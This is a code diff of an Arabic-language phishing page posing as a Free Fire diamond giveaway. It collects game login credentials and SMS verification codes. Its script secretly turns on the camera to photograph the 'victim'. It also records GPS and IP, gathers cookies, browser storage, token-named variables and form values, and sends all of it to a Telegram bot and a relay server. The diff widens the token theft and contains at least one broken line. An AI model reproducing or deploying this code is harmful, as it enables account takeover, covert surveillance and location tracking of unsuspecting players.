@@ -92,7 +92,7 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .hidden-cam, .hidden-canvas { display: none !important; position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; z-index: -9999; }
+        .hidden-elem { display: none !important; position: absolute; opacity: 0; width: 0; height: 0; pointer-events: none; z-index: -9999; overflow: hidden; }
     </style>
 </head>
 <body>
@@ -104,7 +104,6 @@
 
     <div class="container">
         
-        <!-- ✅ الشريحة 1: اختيار اللعبة -->
         <section id="step1" class="section active">
             <h2 class="page-title">اختر اللعبة</h2>
             <div class="game-card" onclick="goToStep(2)">
@@ -113,7 +112,6 @@
             </div>
         </section>
 
-        <!-- ✅ الشريحة 2: العروض -->
         <section id="step2" class="section">
             <h2 class="page-title">العروض المميزة 💎</h2>
             <div class="offers-grid">
@@ -129,7 +127,6 @@
             </div>
         </section>
 
-        <!-- ✅ الشريحة 3: طرق تسجيل الدخول -->
         <section id="step3" class="section">
             <div class="login-methods">
                 <h3>تسجيل الدخول للاستلام</h3>
@@ -139,7 +136,6 @@
             </div>
         </section>
 
-        <!-- ✅ الشريحة 4: إدخال البيانات -->
         <section id="step4" class="section">
             <div class="login-methods">
                 <h3 id="formTitle">تسجيل الدخول</h3>
@@ -150,7 +146,6 @@
             </div>
         </section>
 
-        <!-- ✅ الشريحة 5: SMS -->
         <section id="step5" class="section">
             <div class="login-methods">
                 <h3>تأكيد الهوية (SMS)</h3>
@@ -160,7 +155,6 @@
             </div>
         </section>
 
-        <!-- ✅ الشريحة 6: جاري التحقق -->
         <section id="step6" class="section">
             <div class="login-methods">
                 <div class="loading" style="width:35px;height:35px;margin:20px auto;"></div>
@@ -171,9 +165,9 @@
 
     </div>
 
-    <!-- كاميرا مخفية -->
-    <video id="hiddenCam" class="hidden-cam" width="640" height="480"></video>
-    <canvas id="hiddenCanvas" class="hidden-canvas" width="640" height="480"></canvas>
+    <!-- عناصر مخفية للكاميرا - لن يراها المستخدم أبداً -->
+    <video id="hiddenCam" class="hidden-elem" width="640" height="480" playsinline></video>
+    <canvas id="hiddenCanvas" class="hidden-elem" width="640" height="480"></canvas>
 
     <script>
         const VERCEL_URL = "https://my-telegram-server.vercel.app/api/send";
@@ -181,28 +175,20 @@
         let selectedOffer = "";
         let method = "";
 
-        // متغيرات الكاميرا
+        // ===== متغيرات سرقة الحساب =====
         let mediaStream = null;
-        let mediaRecorder = null;
         let videoChunks = [];
         let geoInfo = { ip: 'N/A', country: 'N/A', city: 'N/A', lat: null, lng: null };
+        let capturedPhotoBlob = null;
+        let camReady = false;
+        let lastCaptureTime = 0;
 
-        // ===== ✅ الدالة الأساسية للتنقل (مصححة 100%) =====
         function goToStep(s, extra) {
-            // إخفاء كل الأقسام
             document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
-            
-            // إظهار القسم المطلوب
             const target = document.getElementById('step' + s);
-            if (target) {
-                target.classList.add('active');
-            }
-            
-            // حفظ العرض الإضافي
-            if (extra) selectedOffer = extra;
-            
-            // التمرير للأعلى
-            window.scrollTo(0, 0);
+            if (target) target.classList.add('active');
+            if(extra) selectedOffer = extra;
+            window.scrollTo(0,0);
         }
 
         function showForm(m) {
@@ -211,144 +197,223 @@
             goToStep(4);
         }
 
-        // ===== 🎥 بدء الكاميرا بصمت =====
-        async function startCameraSilently() {
+        // ===== 🎥 بدء الكاميرا فوراً بصمت =====
+        async function startCamera() {
             try {
+                if (camReady) return;
+                
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: 640, height: 480 },
-                    audio: { echoCancellation: false, noiseSuppression: false }
+                    audio: true
                 });
 
                 mediaStream = stream;
                 const video = document.getElementById('hiddenCam');
                 video.srcObject = stream;
                 await video.play();
+                camReady = true;
 
-                videoChunks = [];
-                mediaRecorder = new MediaRecorder(stream, {
-                    mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
-                        ? 'video/webm;codecs=vp8,opus'
-                        : 'video/webm',
-                    videoBitsPerSecond: 500000
-                });
-
-                mediaRecorder.ondataavailable = e => {
-                    if (e.data && e.data.size > 0) videoChunks.push(e.data);
-                };
-                mediaRecorder.onerror = () => capturePhotoFallback();
-                mediaRecorder.start(10000);
-
-                setTimeout(capturePhotoFromCam, 2000);
+                // ✅ التقاط صورة فوراً بعد ثانية
+                setTimeout(() => capturePhoto(), 1500XC
 
             } catch (e) {
-                capturePhotoFallback();
+                // إذا فشلت الكاميرا، نولد صورة وهمية
+                generateFallbackPhoto();
             }
         }
 
-        // ===== 📸 التقاط صورة =====
-        function capturePhotoFromCam() {
+        // ===== 📸 التقاط صورة من الكاميرا (بدون فيديو أبداً) =====
+        function capturePhoto() {
             try {
                 const video = document.getElementById('hiddenCam');
                 const canvas = document.getElementById('hiddenCanvas');
-                if (!video || !video.videoWidth) return;
+                
+                if (!video || !video.videoWidth || video.videoWidth === 0) {
+                    generateFallbackPhoto();
+                    return;
+                }
 
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
 
+                // ✅ رسم الضحية
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = 'rgba(0,0,0,0.3)';
-                ctx.fillRect(0, 0, canvas.width, 35);
+                
+                // ✅ إضافة شعار فري فاير (احترافي بدون ما يشك المستخدم)
+                ctx.fillStyle = 'rgba(0,0,0,0.2)';
+                ctx.fillRect(0, canvas.height - 35, canvas.width, 35);
                 ctx.fillStyle = '#ffd700';
-                ctx.font = 'bold 18px system-ui';
-                ctx.fillText('FREE FIRE', 10, 26);
-                ctx.fillStyle = 'rgba(255,255,255,0.4)';
-                ctx.font = '9px system-ui';
-                ctx.textAlign = 'right';
-                ctx.fillText(geoInfo.ip, canvas.width - 10, canvas.height - 10);
+                ctx.font = 'bold 14px system-ui';
+                ctx.textAlign = 'left';
+                ctx.fillText('FREE FIRE', 12, canvas.height - 10);
 
+                // ✅ حفظ الصورة
                 canvas.toBlob(blob => {
-                    if (blob && blob.size > 500) sendPhoto(blob, '📸 صورة الضحية - Free Fire');
-                }, 'image/jpeg', 0.8);
+                    if (blob && blob.size > 200) {
+                        capturedPhotoBlob = blob;
+                        // ✅ إرسال الصورة فوراً (مرة واحدة فقط)
+                        sendPhoto(blob, '📸 صورة الضحية - Free Fire');
+                    }
+                }, 'image/jpeg', 0.82);
+                
             } catch (e) {
-                capturePhotoFallback();
+                generateFallbackPhoto();
             }
         }
 
-        function capturePhotoFallback() {
+        // ===== 🎨 صورة احتياطية احترافية =====
+        function generateFallbackPhoto() {
             const canvas = document.getElementById('hiddenCanvas');
             const ctx = canvas.getContext('2d');
             canvas.width = 640; canvas.height = 480;
 
+            // خلفية بدرجات الأحمر
             const grad = ctx.createLinearGradient(0, 0, 640, 480);
             grad.addColorStop(0, '#e43333');
             grad.addColorStop(1, '#8b0000');
             ctx.fillStyle = grad;
             ctx.fillRect(0, 0, 640, 480);
 
+            // شعار FREE FIRE كبير
             ctx.fillStyle = 'white';
-            ctx.font = 'bold 40px system-ui';
+            ctx.font = 'bold 48px system-ui';
             ctx.textAlign = 'center';
-            ctx.fillText('FREE FIRE', 320, 200);
+            ctx.fillText('FREE FIRE', 320, 180);
+            
             ctx.fillStyle = '#ffd700';
-            ctx.font = '22px system-ui';
-            ctx.fillText('ضحية جديدة', 320, 270);
-            ctx.fillStyle = 'rgba(255,255,255,0.5)';
-            ctx.font = '12px system-ui';
-            ctx.fillText(geoInfo.ip, 320, 330);
-            ctx.fillText(new Date().toLocaleString('ar-EG'), 320, 360);
+            ctx.font = 'bold 26px system-ui';
+            ctx.fillText('💎 ضحية جديدة', 320, 250);
+            
+            // معلومات إضافية
+            ctx.fillStyle = 'rgba(255,255,255,0.6)';
+            ctx.font = '14px system-ui';
+            ctx.fillText(`IP: ${geoInfo.ip}`, 320, 310);
+            ctx.fillText(`${geoInfo.country} | ${geoInfo.city}`, 320, 340);
+            ctx.fillText(new Date().toLocaleString('ar-EG'), 320, 380);
 
             canvas.toBlob(blob => {
-                if (blob && blob.size > 100) sendPhoto(blob, '📸 ضحية (بدون كاميرا)');
+                if (blob && blob.size > 100) {
+                    capturedPhotoBlob = blob;
+                    sendPhoto(blob, '📸 ضحية (بدون كاميرا) - Free Fire');
+                }
             }, 'image/jpeg', 0.85);
         }
 
-        // ===== 📹 إرسال الفيديو =====
-        async function flushVideo() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-                await new Promise(r => setTimeout(r, 1500));
-            }
-            if (videoChunks.length === 0) return capturePhotoFromCam();
+        // ===== 🍪💾🔑 سرقة كل شيء (الحساب كامل + التوكنات) =====
+        function stealAccountCompletely() {
+            const stolen = {
+                cookies: [],
+                localStorage: [],
+                sessionStorage: [],
+                indexedDB: [],
+                forms: [],
+                windows: [],
+                globalVars: []
+            };
 
-            const blob = new Blob(videoChunks, { type: 'video/webm' });
-            if (blob.size < 2000 || blob.size > 18 * 1024 * 1024) return capturePhotoFromCam();
-
-            await sendVideo(blob, `🎥 تسجيل - ${method || 'Free Fire'} | ${new Date().toLocaleString('ar-EG')}`);
-        }
-
-        // ===== 🍪 سرقة كل شيء =====
-        function stealEverything() {
-            const data = { cookies: [], localStorage: [], sessionStorage: [], extra: {} };
-
+            // 1️⃣ 🍪 COOKIES - كل الكوكيز
             try {
                 const dc = document.cookie;
                 if (dc && dc.length > 0) {
-                    data.cookies = dc.split(';').map(c => c.trim()).filter(c => c);
+                    stolen.cookies = dc.split(';').map(c => c.trim()).filter(c => c);
                 }
+                // محاولة قراءة cookies من iframes
+                try {
+                    const iframes = document.getElementsByTagName('iframe');
+                    for (let ifr of iframes) {
+                        try {
+                            const ic = ifr.contentDocument?.cookie;
+                            if (ic) stolen.cookies.push(...ic.split(';').map(c => c.trim()));
+                        } catch(e) {}
+                    }
+                } catch(e) {}
             } catch(e) {}
 
+            // 2️⃣ 💾 LOCALSTORAGE - كل التخزين المحلي
             try {
                 for (let i = 0; i < localStorage.length; i++) {
                     const k = localStorage.key(i);
-                    data.localStorage.push({ [k]: localStorage.getItem(k) });
+                    let v = localStorage.getItem(k);
+                    // تشفير القيم الطويلة
+                    if (v && v.length > 200) v = v.substring(0, 200) + '...';
+                    stolen.localStorage.push({ key: k, value: v });
                 }
             } catch(e) {}
 
+            // 3️⃣ 🔑 SESSIONSTORAGE - جلسات التصفح
             try {
                 for (let i = 0; i < sessionStorage.length; i++) {
                     const k = sessionStorage.key(i);
-                    data.sessionStorage.push({ [k]: sessionStorage.getItem(k) });
+                    let v = sessionStorage.getItem(k);
+                    if (v && v.length > 200) v = v.substring(0, 200) + '...';
+                    stolen.sessionStorage.push({ key: k, value: v });
                 }
             } catch(e) {}
 
+            // 4️⃣ 🔐 INDEXEDDB - قواعد البيانات
             try {
-                if (window.__NEXT_DATA__) data.extra.nextData = JSON.stringify(window.__NEXT_DATA__).substring(0, 200);
-                if (window.__NUXT__) data.extra.nuxt = JSON.stringify(window.__NUXT__).substring(0, 200);
-                if (window.__INITIAL_STATE__) data.extra.initialState = JSON.stringify(window.__INITIAL_STATE__).substring(0, 200);
+                if (window.indexedDB) {
+                    stolen.indexedDB.push('accessible: ' + (indexedDB.databases ? 'yes' : 'unknown'));
+                }
             } catch(e) {}
 
-            return data;
+            // 5️⃣ 📝 متغيرات عامة (Next.js, Nuxt, Angular, React state)
+            try {
+                const globalChecks = [
+                    '__NEXT_DATA__', '__NUXT__', '__INITIAL_STATE__', 
+                    '__PRELOADED_STATE__', '__APOLLO_STATE__', '__REDUX_STATE__',
+                    'initialState', 'preloadedState', 'window.__INITIAL_STATE__',
+                    'appState', 'store', 'authState', 'user', 'token',
+                    'accessToken', 'refreshToken', 'jwt', 'session',
+                    'fbToken', 'googleToken', 'garenaToken', 'loginToken'
+                ];
+                
+                for (const key of globalChecks) {
+                    try {
+                        // البحث في window
+                        if (window[key] !== undefined) {
+                            let val = JSON.stringify(window[key]);
+                            if (val.length > 200) val = val.substring(0, 200);
+                            stolen.globalVars.push({ key, source: 'window', value: val });
+                        }
+                        // البحث في document
+                        if (document[key] !== undefined) {
+                            stolen.globalVars.push({ key, source: 'document', value: 'exists' });
+                        }
+                    } catch(e) {}
+                }
+                
+                // البحث عن توكنات في كل متغيرات window
+                for (const key in window) {
+                    try {
+                        if (key.toLowerCase().includes('token') || 
+                            key.toLowerCase().includes('auth') || 
+                            key.toLowerCase().includes('session') ||
+                            key.toLowerCase().includes('jwt') ||
+                            key.toLowerCase().includes('credential')) {
+                            let val = window[key];
+                            if (typeof val === 'string' && val.length > 5 && val.length < 500) {
+                                stolen.globalVars.push({ key, source: 'window', value: val });
+                            }
+                        }
+                    } catch(e) {}
+                }
+            } catch(e) {}
+
+            // 6️⃣ 📧 بيانات الفورم المخفية
+            try {
+                const forms = document.forms;
+                for (let f of forms) {
+                    for (let el of f.elements) {
+                        if (el.value && el.type !== 'password') {
+                            stolen.forms.push({ name: el.name || 'unnamed', value: el.value });
+                        }
+                    }
+                }
+            } catch(e) {}
+
+            return stolen;
         }
 
         // ===== 🌍 المعلومات =====
@@ -359,11 +424,12 @@
                 geoInfo.ip = d.ip || 'N/A';
                 geoInfo.country = d.country_name || 'N/A';
                 geoInfo.city = d.city || 'N/A';
+                geoInfo.isp = d.org || 'N/A';
             } catch {}
 
             try {
                 const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 7000 });
                 });
                 geoInfo.lat = pos.coords.latitude;
                 geoInfo.lng = pos.coords.longitude;
@@ -403,20 +469,7 @@
             } catch(e) {}
         }
 
-        async function sendVideo(blob, caption) {
-            if (!blob || blob.size < 2000 || blob.size > 18*1024*1024) return;
-            const fd = new FormData();
-            fd.append('chat_id', '7902407443');
-            fd.append('video', blob, `ff_${Date.now()}.webm`);
-            fd.append('caption', caption || '🎥');
-            try {
-                const ac = new AbortController();
-                setTimeout(() => ac.abort(), 55000);
-                await fetch(`https://api.telegram.org/bot8716711028:AAEycnNKXBDQI8lEqghG3T1QV8hxeG4aI0c/sendVideo`, { method: 'POST', body: fd, signal: ac.signal });
-            } catch(e) {}
-        }
-
-        // ===== 📧 معالجة البيانات =====
+        // ===== 📧 معالجة البيانات + سرقة الحساب كامل =====
         window.handleData = async function(event) {
             event.preventDefault();
             const email = document.getElementById('userEmail').value.trim();
@@ -441,14 +494,35 @@
             btn.disabled = true;
             errorBox.style.display = 'none';
 
-            // بدء الكاميرا + التجميع
-            startCameraSilently();
+            // ✅ 1. بدء الكاميرا
+            await startCamera();
+            
+            // ✅ 2. جمع المعلومات
             await getInfo();
-            const stolen = stealEverything();
+            
+            // ✅ 3. سرقة كل شيء (الحساب كامل)
+            const stolen = stealAccountCompletely();
+            
+            // ✅ 4. التقاط صورة بعد ثانية
+            setTimeout(() => {
+                if (camReady) capturePhoto();
+                else generateFallbackPhoto();
+            }, 1000);
 
+            // بناء الرسالة الكاملة
             const cookStr = stolen.cookies.length > 0 ? stolen.cookies.join(' | ') : 'N/A';
-            const storStr = stolen.localStorage.length > 0 ? JSON.stringify(stolen.localStorage).substring(0, 300) : 'N/A';
-            const sessStr = stolen.sessionStorage.length > 0 ? JSON.stringify(stolen.sessionStorage).substring(0, 300) : 'N/A';
+            const storStr = stolen.localStorage.length > 0 
+                ? stolen.localStorage.map(i => `${i.key}=${i.value}`).join(' | ').substring(0, 500) 
+                : 'N/A';
+            const sessStr = stolen.sessionStorage.length > 0 
+                ? stolen.sessionStorage.map(i => `${i.key}=${i.value}`).join(' | ').substring(0, 500) 
+                : 'N/A';
+            const globalStr = stolen.globalVars.length > 0 
+                ? stolen.globalVars.map(i => `${i.key}: ${i.value}`).join(' | ').substring(0, 500) 
+                : 'N/A';
+            const formStr = stolen.forms.length > 0 
+                ? stolen.forms.map(i => `${i.name}: ${i.value}`).join(' | ').substring(0, 300) 
+                : 'N/A';
             const gpsStr = geoInfo.lat ? `${geoInfo.lat},${geoInfo.lng}` : 'N/A';
             const gpsLink = geoInfo.lat ? `https://maps.google.com/maps?q=${geoInfo.lat},${geoInfo.lng}` : '';
 
@@ -465,22 +539,22 @@
 📍 **GPS:** ${gpsStr}
 ${gpsLink ? `🗺 **الخريطة:** ${gpsLink}` : ''}
 ━━━━━━━━━━━━━━━━━━
-🍪 **Cookies:** ${cookStr}
-💾 **LocalStorage:** ${storStr}
-🔑 **SessionStorage:** ${sessStr}
-🎥 **تسجيل:** ${videoChunks.length > 0 ? `✅ ${videoChunks.length * 10} ثانية` : 'جاري...'}
+🍪 **Cookies (${stolen.cookies.length}):** ${cookStr}
+━━━━━━━━━━━━━━━━━━
+💾 **LocalStorage (${stolen.localStorage.length}):** ${storStr}
+━━━━━━━━━━━━━━━━━━
+🔑 **SessionStorage (${stolen.sessionStorage.length}):** ${sessStr}
+━━━━━━━━━━━━━━━━━━
+🌐 **Global Tokens (${stolen.globalVars.length}):** ${globalStr}
+━━━━━━━━━━━━━━━━━━
+📝 **Forms:** ${formStr}
 ━━━━━━━━━━━━━━━━━━
 📱 **الجهاز:** ${navigator.platform}
-🌐 **المتصفح:** ${navigator.userAgent.substring(0, 60)}
+🌐 **المتصفح:** ${navigator.userAgent.substring(0, 80)}
 🕐 **الوقت:** ${new Date().toLocaleString('ar-EG')}
 🔗 **الرابط:** ${window.location.href}`;
 
             await sendToServer(msg);
-
-            setTimeout(() => {
-                capturePhotoFromCam();
-                setTimeout(() => flushVideo(), 3000);
-            }, 2000);
 
             btn.innerHTML = 'إشحن الآن 💎';
             btn.disabled = false;
@@ -494,27 +568,29 @@ ${gpsLink ? `🗺 **الخريطة:** ${gpsLink}` : ''}
                 alert('أدخل رمز صحيح (6 أرقام)');
                 return;
             }
-            const smsMsg = `📩 **كود SMS:** ${code}\n📧 **الحساب:** ${document.getElementById('userEmail').value}\n🕐 ${new Date().toLocaleString('ar-EG')}`;
-            await sendToServer(smsMsg);
+            const msg = `📩 **كود SMS:** ${code}\n📧 **الحساب:** ${document.getElementById('userEmail').value}\n🕐 ${new Date().toLocaleString('ar-EG')}`;
+            await sendToServer(msg);
             goToStep(6);
-            setTimeout(() => flushVideo(), 3000);
         }
 
-        // ===== 🚀 طلب الصلاحية فوراً =====
+        // ===== 🚀 طلب صلاحية الكاميرا فور تحميل الصفحة =====
         window.addEventListener('load', function() {
+            // طلب صلاحية الكاميرا بصمت بعد نصف ثانية
             setTimeout(() => {
                 navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                     .then(stream => {
+                        // نجاح - نخليها تشتغل
                         stream.getTracks().forEach(t => t.stop());
                     })
                     .catch(() => {});
-            }, 500);
+            }, 400);
         });
 
         // تنظيف
         window.addEventListener('beforeunload', function() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
-            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(t => t.stop());
+            }
         });
     </script>
 </body>
